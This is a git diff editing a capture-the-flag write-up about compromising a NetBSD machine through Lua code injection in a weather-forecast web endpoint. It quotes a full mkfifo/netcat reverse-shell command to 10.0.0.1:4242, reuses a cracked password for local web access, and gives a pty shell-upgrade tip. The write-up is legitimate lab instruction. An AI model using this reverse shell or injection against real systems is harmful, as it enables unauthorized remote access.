@@ -136,11 +136,11 @@ I saw a cron in the process output, as well as a weather.lua
 
 I tried checking for local file inclusion and code execution vulnerabilities but they just gave errors.
 
-### Port 80 - `/weather/forecast`
+### Port 80 - `/weather/forecast/`
 
 ![](../../.gitbook/assets/9.5-weather-forecast.png)
 
-/forecast from dirbuster
+I found a directory `/weather/forecast/` using Dirbuster.
 
 ![](../../.gitbook/assets/9-weather-forecast.png)
 
@@ -148,17 +148,17 @@ I tried checking for local file inclusion and code execution vulnerabilities but
 
 ![](../../.gitbook/assets/10-weather-test.png)
 
-test showed unknown city error
+'test' showed unknown city error
 
 ![](../../.gitbook/assets/11-lua-error.png)
 
-Sending a query of `'` \(single quote\) resulted in a "nil" Lua error.  I expected to test for a SQL injection vulnerability, but got something else instead.  I did some reading on Lua syntax to see if I could figure out how to get this to execute code.
+Sending a query of `'` \(single quote\) resulted in a "nil value" Lua error.  I expected to test for a SQL injection vulnerability, but got something else instead.  I did some reading on Lua syntax to see if I could figure out how to get this to execute code.
 
 * [https://www.lua.org/manual/5.1/manual.html](https://www.lua.org/manual/5.1/manual.html)
 
 ![](../../.gitbook/assets/12-noscript-xss-warning.png)
 
-My first attempt triggered a warning from NoScript about a possible XSS attack.  I had to close off the function parameters with `')` and use a Lua comment `--` at the end closed off the insertion to get this warning.  I still did not get code execution however.
+My first attempt triggered a warning from NoScript about a possible XSS attack.  I had to close off the function parameters with `')`, separate the commands with a `;`, and use a Lua comment `--` at the end closed off the insertion to get this warning.  I still did not get code execution however.
 
 ![](../../.gitbook/assets/12-lua-code-exec.png)
 
@@ -211,7 +211,9 @@ The command `uname -a` revealed this to be a NetBSD system.  I wasn't sure what 
 
 > `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f`
 
-I found a reverse shell with nc \(without -e\) for openbsd, and hoped that it would work for this distro as well.
+![](../../.gitbook/assets/13-reverse-shell.png)
+
+I found a reverse shell with nc \(without -e\) for openbsd, and hoped that it would work for this distro as well.  The response hung for awhile after sending, which was a good sign.
 
 ## Initial Foothold
 
@@ -313,7 +315,50 @@ Stopped: Sat Mar 27 20:11:48 2021
 
 It cracked within seconds to reveal the password `iamthebest`.
 
+![](../../.gitbook/assets/14-webapi.png)
+
+I was able to use this to log into the other web portal on port 80.
+
+![](../../.gitbook/assets/15-webapi.png)
+
+There did not seem to be anything further I could do here other than discover the `/weather/forecast/` endpoint I had already used to gain access to the machine.
+
 ## Road to User
+
+```text
+$ find / -user r.michaels 2>/dev/null
+/proc/378
+/proc/378/fd
+/proc/378/task
+/proc/378/emul
+/proc/378/auxv
+/proc/378/cmdline
+/proc/378/environ
+/proc/378/fpregs
+/proc/378/limit
+/proc/378/map
+/proc/378/maps
+/proc/378/mem
+/proc/378/note
+/proc/378/notepg
+/proc/378/regs
+/proc/378/stat
+/proc/378/statm
+/proc/378/status
+/var/mail/r.michaels
+/home/r.michaels
+```
+
+Since I only had one user to go off, I tried using that password to switch users to `r.michaels` but failed.  I also tried finding everything that `r.michaels` had access to, but there wasn't much.
+
+```text
+$ ls -la /home/r.michaels
+ls: r.michaels: Permission denied
+$ ls -la /var/mail/r.michaels
+-rw-------  1 r.michaels  wheel  9172 Sep 16  2020 /var/mail/r.michaels
+```
+
+I tried to see what was in those directories, but couldn't see anything I could access.
 
 ```text
 $ ps -auxw
@@ -349,9 +394,11 @@ root         389  0.0  0.0  23792  1584 ttyE2 Is+  10:22AM 0:00.00 /usr/libexec/
 root         433  0.0  0.0  19784  1584 ttyE3 Is+  10:22AM 0:00.00 /usr/libexec/getty Pc ttyE3
 ```
 
-There was a process run by the `r.michaels` user that seemed to be running another instance of the weather.lua, on port 3001.
+There was a process run by the `r.michaels` user that seemed to be running another instance of the `weather.lua`, this time on port 3001.
 
-Note: from others users attempts from the process output I saw one that said `python3.7 -c import pty;pty.spawn("/bin/sh")`. You may be able to use this to upgrade your shell. I didn't notice this until after I was done, and it would have been metagaming anyways!
+{% hint style="info" %}
+Note: From other user's attempts from the process output I saw one that showed**`python3.7 -c import pty;pty.spawn("/bin/sh")`**. You may be able to use this to upgrade your shell. I didn't notice this until after I was done, and it would have been metagaming anyways!
+{% endhint %}
 
 ```text
 $ curl http://localhost:3001
@@ -388,47 +435,10 @@ $ curl -u webapi_user:iamthebest http://localhost:3001
 </html>
 ```
 
-since this
+since this page was the same as the one on port 80 I tried logging in as `webapi_user`.  This time I was able to retrieve the site.  It looked exactly the same as the one on port 80.
 
 ```text
-$ find / -user r.michaels 2>/dev/null
-/proc/378
-/proc/378/fd
-/proc/378/task
-/proc/378/emul
-/proc/378/auxv
-/proc/378/cmdline
-/proc/378/environ
-/proc/378/fpregs
-/proc/378/limit
-/proc/378/map
-/proc/378/maps
-/proc/378/mem
-/proc/378/note
-/proc/378/notepg
-/proc/378/regs
-/proc/378/stat
-/proc/378/statm
-/proc/378/status
-/var/mail/r.michaels
-/home/r.michaels
-```
-
-I tried finding everything that `r.michaels` had access to, but there wasn't much
-
-```text
-$ ls -la /home/r.michaels
-ls: r.michaels: Permission denied
-$ ls -la /var/mail/r.michaels
--rw-------  1 r.michaels  wheel  9172 Sep 16  2020 /var/mail/r.michaels
-```
-
-I tried to see what was in those directories, but couldn't see anything I could access
-
-since curl
-
-```text
-$ curl -u webapi_user:iamthebest http://localhost:3001/~
+$ curl -u webapi_user:iamthebest http://localhost:3001/r.michaels
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100   206  100   206    0     0  68666      0 --:--:-- --:--:-- --:--:-- 68666
@@ -447,6 +457,8 @@ $ curl -u webapi_user:iamthebest http://localhost:3001/~/
 <hr><address><a href="//localhost:3001/">localhost:3001</a></address>
 </body></html>
 ```
+
+I tried to see if I could access the home directory since this process was being run as 
 
 searched for how to access home directory in a URL and found
 
